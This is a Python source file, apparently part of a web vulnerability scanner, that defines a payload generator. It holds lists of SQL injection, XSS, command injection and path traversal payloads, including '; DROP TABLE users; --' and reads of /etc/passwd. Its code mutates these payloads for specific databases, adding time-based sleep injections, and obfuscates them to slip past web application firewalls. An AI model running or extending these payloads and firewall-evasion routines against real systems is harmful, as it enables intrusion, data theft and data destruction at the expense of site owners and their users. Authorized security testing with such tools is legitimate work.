# ai/payload_generator.py
import random
import re
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import logging

logger = logging.getLogger(__name__)

@dataclass
class PayloadContext:

    technology: str = "unknown"
    waf_detected: bool = False
    waf_type: Optional[str] = None
    response_patterns: Dict[str, Any] = None
    previous_payloads: List[Dict] = None

class AIPayloadGenerator:
    
    def __init__(self):
        self.payload_library = self._initialize_payload_library()
        self.obfuscation_techniques = [
            'url_encode',
            'double_url_encode',
            'html_encode',
            'unicode_encode',
            'base64_encode',
            'hex_encode',
            'comment_obfuscation',
            'case_variation',
            'whitespace_variation'
        ]
        
    def _initialize_payload_library(self) -> Dict[str, List[str]]:

        return {
            'sqli': [
                "'",
                "''",
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "' OR 1=1",
                "' OR 1=1 --",
                "' OR 1=1 #",
                "' OR 1=1/*",
                "') OR '1'='1",
                "') OR ('1'='1",
                "1' AND 1=1 --",
                "1' AND 1=2 --",
                "1' OR '1'='1",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' AND 1=CONVERT(int, (SELECT @@version)) --",
                "'; DROP TABLE users; --",
                "1 AND (SELECT COUNT(*) FROM users) > 0",
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
                "<video><source onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<object data=javascript:alert('XSS')>",
                "<embed src=javascript:alert('XSS')>",
            ],
            'rce': [
                "; id",
                "; whoami",
                "; cat /etc/passwd",
                "| id",
                "| whoami",
                "`id`",
                "$(id)",
                "; echo 'test'",
                "&& id",
                "|| id",
                "; dir",
                "; type file.txt",
                "| dir",
            ],
            'lfi': [
                "../../../etc/passwd",
                "../../../etc/passwd%00",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc%2fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "../../../windows/system32/drivers/etc/hosts",
                "....//....//....//windows/system32/drivers/etc/hosts",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "php://input",
                "expect://id",
                "data://text/plain,<?php phpinfo(); ?>",
            ]
        }
    
    def generate_contextual_payloads(self, vulnerability_type: str, context: PayloadContext) -> List[Dict[str, Any]]:
       
        base_payloads = self.payload_library.get(vulnerability_type, [])
        enhanced_payloads = []
        
        for payload in base_payloads:

            mutated_payloads = self._mutate_payload(payload, context)
            
            for mutated in mutated_payloads:

                obfuscated_payloads = self._obfuscate_payload(mutated, context)
                
                for obfuscated in obfuscated_payloads:
                    enhanced_payloads.append({
                        'original': payload,
                        'mutated': mutated,
                        'obfuscated': obfuscated,
                        'technique_used': self._get_technique_name(),
                        'context_match': self._check_context_match(obfuscated, context)
                    })
        
        enhanced_payloads.sort(key=lambda x: x['context_match'], reverse=True)
        
        return enhanced_payloads[:20] 
    
    def _mutate_payload(self, payload: str, context: PayloadContext) -> List[str]:

        mutations = []
        
        if context.technology:
            tech_mutations = self._technology_specific_mutations(payload, context.technology)
            mutations.extend(tech_mutations)
        
        if context.previous_payloads:
            pattern_mutations = self._pattern_based_mutations(payload, context.previous_payloads)
            mutations.extend(pattern_mutations)
        
        mutations.append(payload)  
        
        if "'" in payload:
            mutations.append(payload.replace("'", "\""))
            mutations.append(payload.replace("'", "`"))
        
        if "OR" in payload:
            mutations.append(payload.replace("OR", "||"))
            mutations.append(payload.replace("OR", "or"))
            mutations.append(payload.replace("OR", "Or"))
        
        if any(comment in payload for comment in ['--', '/*', '#']):
            mutations.append(payload.replace('--', '/*'))
            mutations.append(payload.replace('/*', '--'))
            mutations.append(payload + ' #')
        
        return list(set(mutations))  # إزالة التكرارات
    
    def _technology_specific_mutations(self, payload: str, technology: str) -> List[str]:

        mutations = []
        
        tech_lower = technology.lower()
        
        if 'mysql' in tech_lower:
            mutations.append(payload.replace('SELECT', 'SELECT/*!*/'))
            mutations.append(payload.replace('SELECT', 'SELECT/*!32302*/'))
            
        elif 'mssql' in tech_lower:
            mutations.append(payload.replace('SELECT', 'SELECT/**/'))
            mutations.append(payload + ';WAITFOR DELAY \'0:0:5\'--')
            
        elif 'postgresql' in tech_lower:
            mutations.append(payload.replace('SELECT', 'SELECT/*'))
            mutations.append(payload + '; SELECT pg_sleep(5)--')
            
        elif 'oracle' in tech_lower:
            mutations.append(payload.replace('SELECT', 'SELECT/*+*/'))
            mutations.append(payload + '; DBMS_LOCK.SLEEP(5)--')
            
        return mutations
    
    def _pattern_based_mutations(self, payload: str, previous_payloads: List[Dict]) -> List[str]:

        mutations = []
        
        successful_payloads = [p for p in previous_payloads if p.get('success', False)]
        
        if not successful_payloads:
            return mutations
        
        for successful in successful_payloads:
            successful_payload = successful.get('payload', '')
            
            if 'url_encode' in successful.get('technique', ''):
                mutations.append(self._apply_url_encode(payload))
            
            if 'comment' in successful_payload:

                mutations.append(self._add_comments(payload, style='similar'))
        
        return mutations
    
    def _obfuscate_payload(self, payload: str, context: PayloadContext) -> List[str]:

        obfuscated_payloads = []
        
        if context.waf_detected:
            techniques = random.sample(self.obfuscation_techniques, 
                                     min(3, len(self.obfuscation_techniques)))
        else:
            techniques = random.sample(self.obfuscation_techniques, 1)
        
        for technique in techniques:
            obfuscated = self._apply_obfuscation(payload, technique)
            if obfuscated:
                obfuscated_payloads.append(obfuscated)
        
        return obfuscated_payloads if obfuscated_payloads else [payload]
    
    def _apply_obfuscation(self, payload: str, technique: str) -> Optional[str]:

        try:
            if technique == 'url_encode':
                from urllib.parse import quote
                return quote(payload)
            
            elif technique == 'double_url_encode':
                from urllib.parse import quote
                return quote(quote(payload))
            
            elif technique == 'html_encode':
                return payload.replace('<', '&lt;').replace('>', '&gt;')
            
            elif technique == 'unicode_encode':
                return ''.join([f'%u{ord(c):04x}' for c in payload])
            
            elif technique == 'base64_encode':
                import base64
                return base64.b64encode(payload.encode()).decode()
            
            elif technique == 'hex_encode':
                return payload.encode().hex()
            
            elif technique == 'comment_obfuscation':

                parts = list(payload)
                if len(parts) > 3:
                    insert_pos = random.randint(1, len(parts)-2)
                    parts.insert(insert_pos, '/**/')
                return ''.join(parts)
            
            elif technique == 'case_variation':

                return ''.join(
                    random.choice([c.upper(), c.lower()]) if c.isalpha() else c 
                    for c in payload
                )
            
            elif technique == 'whitespace_variation':

                return payload.replace(' ', random.choice(['  ', '\t', '\n', '\r']))
            
        except Exception as e:
            logger.debug(f"Obfuscation failed for {technique}: {e}")
        
        return None
    
    def _get_technique_name(self) -> str:

        return random.choice(self.obfuscation_techniques)
    
    def _check_context_match(self, payload: str, context: PayloadContext) -> float:

        score = 0.5  

        if context.waf_detected:
            if any(tech in payload for tech in ['%', '&', ';', '/**/']):
                score += 0.3
        
        if context.technology:
            tech_score = self._calculate_tech_score(payload, context.technology)
            score += tech_score
        
        return min(score, 1.0)  # الحد الأقصى 1.0
    
    def _calculate_tech_score(self, payload: str, technology: str) -> float:

        tech_lower = technology.lower()
        
        if 'mysql' in tech_lower and '/*!' in payload:
            return 0.2
        elif 'mssql' in tech_lower and 'WAITFOR' in payload:
            return 0.2
        elif 'postgresql' in tech_lower and 'pg_sleep' in payload:
            return 0.2
        elif 'oracle' in tech_lower and 'DBMS_LOCK' in payload:
            return 0.2
        
        return 0.0
    
    def _apply_url_encode(self, payload: str) -> str:

        from urllib.parse import quote
        return quote(payload)
    
    def _add_comments(self, payload: str, style: str = 'similar') -> str:

        if style == 'similar':
            comments = ['/**/', '/*!*/', '/*!32302*/', '/*']
            return payload + random.choice(comments)
        return payload
